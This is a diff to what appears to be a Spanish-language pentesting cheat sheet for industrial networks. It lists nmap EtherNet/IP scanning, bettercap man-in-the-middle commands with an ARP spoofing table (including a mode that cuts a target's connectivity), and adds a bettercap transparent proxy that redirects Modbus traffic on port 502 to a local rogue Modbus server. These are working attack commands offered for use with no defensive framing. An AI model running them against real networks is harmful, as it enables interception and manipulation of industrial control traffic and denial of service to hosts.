@@ -58,8 +58,8 @@ nmap --script enip-info -sU -p 44818 <ip> # EtherNet/IP
 
 ## MITM
 ```bash
-sudo go/bin/bettercap -iface wlan0
-sudo go/bin/bettercap -iface wlan0 -caplet http-ui
+sudo bettercap -iface wlan0
+sudo bettercap -iface wlan0 -caplet http-ui
 ```
 
 | Orden | Descripción |
@@ -71,3 +71,12 @@ sudo go/bin/bettercap -iface wlan0 -caplet http-ui
 | set arp.spoof.internal true | Las conexiones locales entre ordenadores de la red también serán falsificadas, de lo contrario solo se falsificarán las conexiones que vayan hacia y desde la red externa. |
 | arp.spoof on| Iniciar arp spoofing |
 | arp.ban on | ARP spoofing en modo de prohibición, lo que significa que la conectividad del objetivo no funcionará. | 
+
+### Modbus transparent proxy
+set tcp.address 10.10.10.200
+set tcp.port 502
+set tcp.tunnel.address 127.0.0.1
+set tcp.tunnel.port 502
+tcp.proxy on
+
+> Recodar, tienes que correr un proxy modbus en local para que funcione `modbus/rogue_server.py`
